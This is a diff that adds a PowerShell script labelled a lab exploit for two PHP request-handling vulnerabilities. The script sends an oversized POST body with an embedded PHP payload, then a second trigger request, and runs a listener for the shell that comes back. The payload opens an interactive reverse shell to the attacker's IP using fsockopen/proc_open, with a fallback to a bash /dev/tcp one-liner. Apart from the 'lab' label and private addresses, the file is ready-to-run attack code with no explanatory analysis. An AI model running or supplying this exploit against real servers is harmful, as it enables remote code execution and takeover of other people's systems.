@@ -1,0 +1,276 @@
+<#
+  php2shell.ps1 - lab exploit for CVE-2026-109618 / CVE-2026-109619
+
+  Window 1 (listener):  .\php2shell.ps1 -Mode listen
+  Window 2 (attacker):  .\php2shell.ps1 -Mode fire
+
+  Important:
+    Start the listener BEFORE running the fire mode.
+#>
+[CmdletBinding()]
+param(
+    [ValidateSet('fire','listen')] [string]$Mode    = 'fire',
+    [string]$Target    = '192.168.111.57',   # victim
+    [int]$HttpPort     = 80,
+    [string]$ShellIp   = '192.168.111.60',   # attacker
+    [int]$ShellPort    = 4444,
+    [long]$BodySize    = 32MB,
+    [string]$Path      = '/pwn.php',
+    [int]$ResponseKeep = 0                   # 0 = read full response
+)
+
+$ErrorActionPreference = 'Stop'
+
+# ------------------------------------------------------------------ payload
+# Runs inside the PHP worker. Forks a child that opens an interactive
+# /bin/bash on a socket back to the attacker; the HTTP request itself returns
+# immediately so the worker stays free for the follow-up request. The /tmp
+# guard means duplicate executions (both payload copies, re-runs) = one shell.
+$payload = @'
+<?php
+if (!@file_exists('/tmp/.p2s_done')) {
+  @file_put_contents('/tmp/.p2s_done', '1');
+
+  $ip = '__SHELLIP__';
+  $port = __SHELLPORT__;
+
+  if (function_exists('pcntl_fork')) {
+    $pid = pcntl_fork();
+    if ($pid === 0) {
+      for ($i = 0; $i < 60; $i++) {
+        $s = @fsockopen($ip, $port, $errno, $errstr, 1);
+        if ($s) {
+          $p = @proc_open('/bin/bash -i', array(0 => $s, 1 => $s, 2 => $s), $pipes);
+          if ($p) {
+            break;
+          }
+          @fclose($s);
+        }
+        sleep(1);
+      }
+      exit(0);
+    }
+  } else {
+    $cmd = sprintf(
+      "bash -c 'i=0; while [ \$i -lt 60 ]; do rm -f /tmp/.p2s_shell; (exec 3<>/dev/tcp/%s/%d 2>/dev/null && touch /tmp/.p2s_shell && exec /bin/bash -i <&3 >&3 2>&3) && break; [ -f /tmp/.p2s_shell ] && break; i=\$((i+1)); sleep 1; done' >/dev/null 2>&1 &'",
+      $ip,
+      $port
+    );
+    @system($cmd);
+  }
+}
+?>
+'@
+
+$payload      = $payload.Replace('__SHELLIP__', $ShellIp).Replace('__SHELLPORT__', [string]$ShellPort)
+$payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+
+# Canary lines: valid PHP (comments) AND look like leaked secrets.
+$canary = [System.Text.Encoding]::ASCII.GetBytes("//api_key=sk-lab-canary-9f8e7d6c5b4a3210 PHPSESSID=labp2s0001`n")
+
+function New-ExploitBody {
+    param(
+        [long]$Total,
+        [byte[]]$PayloadBytes,
+        [byte[]]$Canary
+    )
+
+    if ($Total -lt $PayloadBytes.Length) {
+        throw "BodySize is too small for the payload."
+    }
+
+    $body = New-Object byte[] $Total
+    $tile = New-Object byte[] 1MB
+
+    $i = 0
+    while ($i -lt 1MB) {
+        $n = [Math]::Min($Canary.Length, 1MB - $i)
+        [Array]::Copy($Canary, 0, $tile, $i, $n)
+        $i += $n
+    }
+
+    $j = 0
+    while ($j -lt $Total) {
+        [Array]::Copy($tile, 0, $body, $j, [Math]::Min(1MB, $Total - $j))
+        $j += 1MB
+    }
+
+    # payload #1 at the expected OOM boundary (halfway), #2 at the very end (the tail)
+    [Array]::Copy($PayloadBytes, 0, $body, [int]($Total / 2), $PayloadBytes.Length)
+    [Array]::Copy($PayloadBytes, 0, $body, $Total - $PayloadBytes.Length, $PayloadBytes.Length)
+
+    return $body
+}
+
+function Invoke-HttpRequest {
+    param(
+        [string]$TargetHost,
+        [int]$Port,
+        [string]$Method,
+        [string]$Path,
+        [byte[]]$Body,
+        [string]$ContentType = 'application/x-www-form-urlencoded',
+        [int]$Keep = 0
+    )
+
+    $c = New-Object System.Net.Sockets.TcpClient
+
+    try {
+        $c.Connect($TargetHost, $Port)
+        $s = $c.GetStream()
+
+        $hdr = "$Method $Path HTTP/1.1`r`nHost: $TargetHost`r`nContent-Type: $ContentType`r`nContent-Length: $($Body.Length)`r`nConnection: close`r`n`r`n"
+        $hb  = [System.Text.Encoding]::ASCII.GetBytes($hdr)
+
+        $s.Write($hb, 0, $hb.Length)
+
+        $off = 0
+        while ($off -lt $Body.Length) {
+            $n = [Math]::Min(1MB, $Body.Length - $off)
+            $s.Write($Body, $off, $n)
+            $off += $n
+        }
+
+        $s.Flush()
+
+        $ms  = New-Object System.IO.MemoryStream
+        $buf = New-Object byte[] 65536
+        $got = 0
+
+        while ($true) {
+            $n = $s.Read($buf, 0, $buf.Length)
+            if ($n -le 0) { break }
+
+            $ms.Write($buf, 0, $n)
+            $got += $n
+
+            if ($Keep -gt 0 -and $got -ge $Keep) {
+                break
+            }
+        }
+
+        # If we stopped early, drain the rest so the socket can close cleanly.
+        if ($Keep -gt 0) {
+            try {
+                while ($true) {
+                    $n = $s.Read($buf, 0, $buf.Length)
+                    if ($n -le 0) { break }
+                }
+            } catch {
+                # Ignore drain errors.
+            }
+        }
+
+        return [PSCustomObject]@{
+            Raw = $ms.ToArray()
+        }
+    }
+    finally {
+        $c.Close()
+    }
+}
+
+function Show-Bits {
+    param(
+        [byte[]]$B,
+        [int]$N = 512
+    )
+
+    if (-not $B -or $B.Length -eq 0) {
+        return '(empty body)'
+    }
+
+    $s = [System.Text.Encoding]::ASCII.GetString($B, 0, [Math]::Min($N, $B.Length))
+    return ($s -replace '[^\x20-\x7e]', '.')
+}
+
+function Test-Canary {
+    param(
+        [byte[]]$B
+    )
+
+    if (-not $B -or $B.Length -eq 0) {
+        return $false
+    }
+
+    $text = [System.Text.Encoding]::UTF8.GetString($B)
+    return ($text -match 'sk-lab-canary')
+}
+
+# -------------------------------------------------------------------- modes
+if ($Mode -eq 'listen') {
+    $l = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $ShellPort)
+    $l.Start()
+
+    Write-Host "[*] Shell listener on 0.0.0.0:$ShellPort - waiting for victim..."
+    Write-Host "[*] Keep this window open. Run -Mode fire in another window."
+
+    while ($true) {
+        $client = $l.AcceptTcpClient()
+        Write-Host "[+] SHELL CONNECTED from $($client.RemoteEndPoint)"
+
+        $stream = $client.GetStream()
+        $reader = New-Object System.IO.StreamReader($stream)
+
+        $pump = [System.Threading.Thread]::New([ScriptBlock]::Create('
+            param($r)
+            $buf = New-Object char[] 8192
+            while ($true) {
+                $n = $r.Read($buf, 0, $buf.Length)
+                if ($n -le 0) { break }
+                [Console]::Write([string]::new($buf, 0, $n))
+                [Console]::Out.Flush()
+            }'))
+
+        $pump.IsBackground = $true
+        $pump.Start($reader)
+
+        while ($true) {
+            $line = [Console]::ReadLine()
+            if ($null -eq $line -or $line -eq 'exit') {
+                break
+            }
+
+            $b = [System.Text.Encoding]::ASCII.GetBytes($line + "`n")
+            $stream.Write($b, 0, $b.Length)
+            $stream.Flush()
+        }
+
+        $client.Close()
+        Write-Host "[-] Shell closed."
+    }
+}
+
+if ($Mode -eq 'fire') {
+    Write-Host "[*] Target: http://$Target:$HttpPort$Path   Shell back to: $ShellIp:$ShellPort"
+    Write-Host "[*] Make sure the listener is already running on $ShellIp:$ShellPort"
+    Write-Host "[*] ResponseKeep: $ResponseKeep (0 = read full response)"
+
+    # --- Request 1: OOM mid-parse (109618 direct exec) + poison worker state (109619) ---
+    $body1 = New-ExploitBody -Total $BodySize -PayloadBytes $payloadBytes -Canary $canary
+
+    Write-Host "[*] (1/2) Sending $([math]::Round($body1.Length/1MB,1)) MB POST (OOM + poison)..."
+    $r1 = Invoke-HttpRequest -TargetHost $Target -Port $HttpPort -Method POST -Path $Path -Body $body1 -Keep $ResponseKeep
+
+    Write-Host ("      response: {0}" -f (Show-Bits $r1.Raw -N 512))
+
+    if (Test-Canary $r1.Raw) {
+        Write-Host "      [!] 109618: cleanup path already executed/leaked the request tail"
+    }
+
+    Start-Sleep -Milliseconds 500
+
+    # --- Request 2: stale-state read on the same worker (109619) ---
+    Write-Host "[*] (2/2) Sending 0-byte trigger POST (stale-state read)..."
+    $r2 = Invoke-HttpRequest -TargetHost $Target -Port $HttpPort -Method POST -Path $Path -Body ([byte[]]@()) -Keep $ResponseKeep
+
+    Write-Host ("      response: {0}" -f (Show-Bits $r2.Raw -N 512))
+
+    if (Test-Canary $r2.Raw) {
+        Write-Host "      [!] 109619 CONFIRMED: stale worker buffer leaked (canary in response)"
+    }
+
+    Write-Host ""
+    Write-Host "[*] If the shell fired it is connecting to the listener window now."
+    Write-Host "    Re-run note: delete /tmp/.p2s_done and /tmp/.p2s_shell on the victim to allow another shell."
+}
